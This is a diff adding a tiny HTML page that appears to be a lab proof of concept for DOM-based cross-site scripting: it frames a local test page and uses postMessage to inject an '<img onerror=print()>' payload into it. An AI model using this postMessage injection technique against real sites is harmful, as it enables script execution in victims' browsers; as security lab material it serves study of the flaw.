@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Language" content="ru">
+</head>
+
+<iframe src="http://192.168.19.1:8888/xss/dom3" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"></iframe>
+
+</html>
